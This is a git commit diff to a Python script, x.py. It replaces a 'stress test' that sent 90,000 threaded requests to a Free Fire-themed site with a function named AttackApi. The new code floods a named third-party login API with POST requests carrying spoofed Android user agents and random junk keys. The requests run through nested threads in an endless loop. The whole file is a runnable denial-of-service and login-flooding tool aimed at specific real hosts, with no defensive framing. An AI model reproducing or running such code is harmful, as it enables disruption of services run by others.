9066c22ac57e1596fe54df9cf0bd5f0dd9745126
Acuma 🌹 <ang089afk@gmail.com>
2025-04-27 23:26:31 +0100

    Update x.py

--- x.py
+++ x.py
@@ -1,28 +1,60 @@
 import requests
 import threading
-import urllib3
+import random
+import string
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def generate_random_string(length):
+    letters_and_digits = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters_and_digits) for i in range(length))
 
-url = "https://www.access.servers.freefireofficial.com/"
+def AttackApi():
+    url = "https://proxy.chams-mebarki-123.workers.dev/api/login"
+    an_agent = f'Mozilla/5.0 (Linux; Android {random.randint(7,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
+    headers = {
+        "content-length": "51",
+        "sec-ch-ua-platform": "Android",
+        "user-agent": an_agent,
+        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+        "content-type": "application/json",
+        "sec-ch-ua-mobile": "?1",
+        "accept": "*/*",
+        "origin": "https://proxy-dashboard.pages.dev",
+        "sec-fetch-site": "cross-site",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+        "referer": "https://proxy-dashboard.pages.dev/",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-GB,en;q=0.9",
+        "priority": "u=1, i"
+    }
 
-def send_request():
-    try:
-        response = requests.get(url, verify=False)
-        print(f"Request sent to {url} - Status code: {response.text}")
-    except requests.exceptions.RequestException as e:
-        print(f"Error: {e}")
+    data = {
+        "account_id": random.randint(7,13),
+        "dashboard_key": generate_random_string(1099)
+    }
 
-def stress_test(num_requests):
+    response = requests.post(url, headers=headers, json=data)
+    return response
+
+def rangeLogin():
     threads = []
-    for _ in range(num_requests):
-        thread = threading.Thread(target=send_request)
+    for i in range(100):
+        thread = threading.Thread(target=AttackApi)
         threads.append(thread)
         thread.start()
 
     for thread in threads:
         thread.join()
 
-num_requests = 90000
+def Range_Range():
+    threads = []
+    for i in range(70):
+        thread = threading.Thread(target=rangeLogin)
+        threads.append(thread)
+        thread.start()
 
-stress_test(num_requests)
+    for thread in threads:
+        thread.join()
+
+while True:
+	Range_Range()
